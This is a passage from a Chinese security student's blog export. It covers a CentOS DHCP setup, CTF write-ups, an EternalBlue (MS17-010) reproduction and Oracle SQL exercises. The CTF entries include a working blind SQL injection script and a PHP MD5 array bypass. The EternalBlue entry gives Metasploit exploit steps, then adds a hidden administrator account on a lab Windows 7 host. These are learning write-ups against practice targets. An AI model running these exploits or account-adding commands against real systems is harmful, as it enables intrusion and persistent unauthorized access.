1:dhcp-12:4.2.5-27.el7.centos      ################################# [100%]<br>[root@localhost Packages] rpm -qa dhcp<br>dhcp-4.2.5-27.el7.centos.x86_64<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">yum下载安装也行</span><br>wget -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<br>yum install dhcp<br></code></pre></td></tr></table></figure><p>再次检查dhcp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost Packages] rpm -qa dhcp<br>dhcp-4.2.5-27.el7.centos.x86_64<br></code></pre></td></tr></table></figure><h4 id="2-DHCP的配置"><a href="#2-DHCP的配置" class="headerlink" title="2.DHCP的配置"></a>2.DHCP的配置</h4><p>更新本地网卡ip配置（我这网卡名就很离谱。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost Packages]# dhclient<br>[root@localhost Packages]# ifconfig<br>eno16777736: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.241.144  netmask 255.255.255.0  broadcast 192.168.241.255<br>        ether 00:0c:29:e0:c1:21  txqueuelen 1000  (Ethernet)<br>        RX packets 631  bytes 40374 (39.4 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 18  bytes 3110 (3.0 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 0  (Local Loopback)<br>        RX packets 930  bytes 80828 (78.9 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 930  bytes 80828 (78.9 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure><p>找到dhcp配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost Packages] find /* -name dhcpd.conf<br>/etc/dhcp/dhcpd.conf<br></code></pre></td></tr></table></figure><p>然后出了一堆问题，解决起来真的是。。。怀疑人生啊</p><p><strong>1.配置静态ip</strong></p><p>vim /etc/sysconfig/network-scripts/ifcfg-eno16777736</p><p><img src="https://img-blog.csdnimg.cn/1d8d641bb55a4c9cb6b6dbb0ed1d07dd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="静态ip"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">检查ip是否正确</span><br>[root@localhost ~]# ifconfig<br>eno16777736: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.111.111  netmask 255.255.255.0  broadcast 192.168.111.255<br>        inet6 fe80::20c:29ff:fee0:c121  prefixlen 64  scopeid 0x20&lt;link&gt;<br>        ether 00:0c:29:e0:c1:21  txqueuelen 1000  (Ethernet)<br>        RX packets 34  bytes 2994 (2.9 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 34  bytes 4361 (4.2 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure><p><strong>2.配置dhcp文件</strong></p><p>在/etc/dhcp/dhcpd.conf增加以下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">subnet 192.168.111.0 netmask 255.255.255.0 &#123;<br>    range 192.168.111.100 192.168.111.200;<br>    option domain-name-servers 192.168.111.1;<br>    option domain-name &quot;qiye&quot;;<br>    option routers 192.168.111.1;<br>    option broadcast-address 192.168.111.255;<br>    default-lease-time 600;<br>    max-lease-time 7200;<br>&#125;<br></code></pre></td></tr></table></figure><p>subnet 后面接是的是你ip的网段，不是你的ip，且后面数值都应该是跟你同个网段的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">启动dhcp服务</span><br>systemctl status dhcpd<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 重启DHCP服务</span> <br><br>[root@localhost ~] systemctl restart dhcpd.service <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查看DHCP状态</span> <br>[root@localhost ~] netstat -luntp | grep dhcp<br>udp        0      0 0.0.0.0:67              0.0.0.0:*                           12514/dhcpd   <br></code></pre></td></tr></table></figure><p><strong>修改虚拟网络配置</strong></p><p><img src="https://img-blog.csdnimg.cn/720e625a7f48424394e6c6b3836245a0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="虚拟网络配置"></p><p>在一台被我渗透了无数遍的靶机win7上，终于。。。。。</p><p><img src="https://img-blog.csdnimg.cn/c555cf6948fc4c18a2126185384165ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="自动分配ip"><br>给win7配置一个nice的IP地址（192.168.111.144）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">subnet 192.168.111.0 netmask 255.255.255.0 &#123;<br>    range 192.168.111.100 192.168.111.200;<br>    option domain-name-servers 192.168.111.1;<br>    option domain-name &quot;qiye&quot;;<br>    option routers 192.168.111.1;<br>    option broadcast-address 192.168.111.255;<br>    default-lease-time 600;<br>    max-lease-time 7200;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 增加一行</span> <br>host boss &#123; <br>    hardware ethernet 00:0C:29:5A:D5:EB; <br>    fixed-address 192.168.111.144; <br>&#125;<br></code></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~] systemctl restart dhcpd.service<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4affb7a3626645bd825a5edba85e6d88.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="给予特定ip"><br>未完待续~~</p>]]></content>
    
    
    <categories>
      
      <category>实训</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DHCP</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2019 华北赛区 Day2 Web1 Hack World 1</title>
    <link href="/2021/10/20/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World%201/"/>
    <url>/2021/10/20/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World%201/</url>
    
    <content type="html"><![CDATA[<p>﻿<strong>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</strong><br><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><hr /><p><strong>解题点：</strong></p><p>异或盲注</p><hr /><p><strong>1.fuzz</strong><br>bp抓包，对post参数id进行fuzz测试<br>and、or、group_concat均被过滤</p><p>但是题目很友好，把flag所在表名和字段名都给你，能省很多事</p><p>感谢大佬整理：<br><a href="https://blog.csdn.net/qq_45793883/article/details/104728901">sql-fuzz字典</a></p><p><strong>2.异或注入</strong><br>输入<code>1，2</code>均有回显<br>但输入字母，会回显<code>bool(false)</code><br>可以确定是数字型注入</p><p>但介于and和or被过滤，所以使用异或注入</p><p><code>0^1</code>能正常回显<code>Hello, glzjin wants a girlfriend.</code>（me too.）<br>可以对库名长度进行爆破<br>0^(length(database())&gt;=1)<br>经过一波测试，11正常，12报错<br>那么数据库名长度为11<br>我甚至把库名爆破出来了，但后来发现没必要<br>库名：<code>ctftraii8ng</code></p><p><strong>3.脚本盲注</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://4af4aa9c-beca-4eac-8b4d-d1fe78022077.node4.buuoj.cn:81&quot;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">129</span><br>    mid=(low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        <span class="hljs-comment">#payload = &quot;0^(ascii(substr((select(database())),%d,1))&gt;%d)&quot; % (i, mid)</span><br>        payload = <span class="hljs-string">&quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot;</span> % (i, mid)<br>        <br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span> : payload<br>        &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=mid<br>        mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>    name=name+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span> (name)<br></code></pre></td></tr></table></figure><p>low和high的值可能需要调整范围（因为爆破出几个有问题的flag）</p><p>正确flag：<br><img src="https://img-blog.csdnimg.cn/53e5e5b4fa4f4f289ff6c24ed1759454.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="唉"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 Ez_bypass 1</title>
    <link href="/2021/10/20/%5BMRCTF2020%5DEz_bypass%201/"/>
    <url>/2021/10/20/%5BMRCTF2020%5DEz_bypass%201/</url>
    
    <content type="html"><![CDATA[<p><strong>[MRCTF2020]Ez_bypass 1</strong><br><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><hr /><p>解题点：<br>1.MD5强碰撞<br>2.is_numerice() 绕过</p><hr /><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>&#123; <br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]; <br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>]; <br>    <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) <br>    &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) <br>        &#123; <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]; <br>            <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>)) <br>            &#123; <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>) <br>                &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>; <br>                    highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>); <br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>); &#125; <br>                <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>; &#125; <br>            &#125; <span class="hljs-keyword">else</span>&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>; &#125; <br>        &#125; <span class="hljs-keyword">else</span>&#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>); &#125; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>; &#125; <br>&#125; <span class="hljs-keyword">else</span>&#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>); &#125; &#125;<br></code></pre></td></tr></table></figure><p>MD5碰撞用数组绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?gg[]=111&amp;id[]=222<br></code></pre></td></tr></table></figure><p>passwd经过!is_numerice()不能为数字，且要弱等于1234567，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">passwd=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3321e3b8f2f04f33a7b75246817f09f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="唉"></p><hr /><p>参考：<br><a href="https://www.cnblogs.com/xhds/p/12312223.html">https://www.cnblogs.com/xhds/p/12312223.html</a><br><a href="https://www.cnblogs.com/Zhu013/p/11465859.html">https://www.cnblogs.com/Zhu013/p/11465859.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝ms17_010复现</title>
    <link href="/2021/10/18/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17_010%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/10/18/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17_010%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>﻿﻿<strong>永恒之蓝ms17_010复现</strong></p><hr /><p><strong>永恒之蓝ms17_010</strong></p><p>2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。</p><p>来源于：百度百科</p><hr /><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>攻击机：kali linux<br>靶机：win 7 企业版</p><hr /><p><strong>1 主机存活扫描</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-sP</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">241.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9d54fa6aa6994273848ba454de904dc2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="alive"><br><strong>2 主机端口扫描</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-sV</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-v</span> <span class="hljs-literal">-T4</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/cf3c1c45db8a4c16b8e02bb8bcb24ff4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="端口"><br>win 7?   端口 445?</p><p><strong>3 永恒之蓝ms17_010复现</strong></p><p>msf开起来</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msfconsole<br>search ms17_010<br>use auxiliary/scanner/smb/smb_ms17_010<br>show options<br><span class="hljs-built_in">set</span> THREADS <span class="hljs-number">40</span><br><span class="hljs-built_in">set</span> RHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ec24c6c1eaa540bf8ecbb3a2a7549b25.png#pic_center" alt="哦豁"><br>ok 可以利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">use exploit/windows/smb/ms17_010_eternalblue<br>show options<br><span class="hljs-built_in">set</span> RHOSTS <span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f5863f74e22c496795ca39efef78f791.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="顺利到我觉得有问题"><br>取得meterpreter控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">没啥好说的，信息收集<br>meterpreter &gt; sysinfo<br>meterpreter &gt; getuid<br>meterpreter &gt; screenshot<br>meterpreter &gt; shell<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ef03af2078e442398c0a37df1c069034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="信息收集"><br>获取win 7桌面截图</p><p><img src="https://img-blog.csdnimg.cn/08b681bda0a6471a8c75c7a256954b81.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="截图"><br>接着是windows 7提权<br>自己是管理员，那么我增加一个用户cyber ,并将他加入到管理员组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami                         //当前用户<br>net user                       //查看存在用户<br>net user cyber cyber /add      //增加一个名为cyber的用户<br>net localgroup administrators cyber /add    //把cyber用户加到用户组<br></code></pre></td></tr></table></figure><p>win7打开计算机管理<br><img src="https://img-blog.csdnimg.cn/6254d61033a3486f8f97bc34a1015785.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="不可思议"></p><p><strong>可以发现，cyber已经是管理员用户组的一员了<br>接下来则是后门和痕迹清理（暂时鸽了）</strong></p><hr /><p>原本没去做永恒之蓝的想法，但是作业。。。一言难尽啊（可能这就是学业上的差距吧）<br><img src="https://img-blog.csdnimg.cn/8d5a885476bd472b9c842d44c730cefe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="唉"><br>没办法，得给自己加工，于是有永恒之蓝的想法。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>ms17_010</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle数据库查询训练</title>
    <link href="/2021/10/14/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%AD%E7%BB%83/"/>
    <url>/2021/10/14/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<p>﻿﻿<strong>Oracle数据库查询训练</strong><br>Oracle查询语句最后的练习<br>范围是scott用户专属自带的emp、dept和salgrade三张表</p><hr /><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p><strong>1.查询薪金高于在部门 30 工作的所有员工的薪金的员工姓名和薪金、部门名称、部门人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.sal,d.dname,temp.count<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) COUNT<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp<br><span class="hljs-keyword">WHERE</span> e.sal <span class="hljs-operator">&gt;</span><span class="hljs-keyword">ALL</span> (<span class="hljs-keyword">SELECT</span> sal <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> deptno <span class="hljs-operator">=</span> <span class="hljs-number">30</span>)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.sal,d.dname,temp.count<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) COUNT<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp<br><span class="hljs-keyword">WHERE</span> e.sal <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(sal) <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> deptno <span class="hljs-operator">=</span> <span class="hljs-number">30</span>)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0d8d58ac11304bde965731e0b02a4721.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="1"><br><br /></p><p><strong>2.查询与 Scott 从事相同工作的所有员工姓名、职位、工资及部门名称、部门人数、领导姓名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.job,e.sal,d.dname,temp.count,m.ename<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count <br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,emp m<br><span class="hljs-keyword">WHERE</span> (e.job <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> job <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> ename <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SCOTT&#x27;</span>))<br><span class="hljs-keyword">AND</span> (e.ename <span class="hljs-operator">!=</span> <span class="hljs-string">&#x27;SCOTT&#x27;</span>)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.mgr(<span class="hljs-operator">+</span>) <span class="hljs-operator">=</span> m.empno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b904c8c1649a4deb972c6e1f7cd31d3a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="2"><br><br /></p><p><strong>3. 查询薪金比 Smith 或 Allen 